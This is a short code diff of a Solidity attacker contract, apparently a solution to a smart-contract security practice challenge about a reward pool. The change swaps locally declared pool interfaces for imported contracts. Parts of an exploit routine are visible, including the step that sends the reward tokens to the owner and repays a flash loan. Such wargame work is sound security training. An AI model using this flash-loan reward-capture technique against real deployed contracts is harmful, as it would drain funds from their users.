@@ -3,18 +3,20 @@
 pragma solidity ^0.8.0;
 
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "../the-rewarder/TheRewarderPool.sol";
+import "../the-rewarder/FlashLoanerPool.sol";
 
 contract TheRewarderAttacker {
 
-    ITheRewarderPool rPool;
+    TheRewarderPool rPool;
     IERC20 rToken;
     IERC20 lToken;
     address owner;
 
     function exploit(
         IERC20 _lToken,
-        IFlashLoanerPool _fPool,
-        ITheRewarderPool _rPool,
+        FlashLoanerPool _fPool,
+        TheRewarderPool _rPool,
         IERC20 _rToken
     ) external {
         lToken = _lToken;
@@ -33,14 +35,4 @@ contract TheRewarderAttacker {
         rToken.transfer(owner, rToken.balanceOf(address(this)));
         lToken.transfer(msg.sender, amount);
     }
-}
-
-interface IFlashLoanerPool {
-    function flashLoan(uint256 amount) external;
-} 
-
-interface ITheRewarderPool {
-    function deposit(uint256 amountToDeposit) external;
-    function withdraw(uint256 amountToWithdraw) external;
-    function distributeRewards() external returns (uint256);
 }
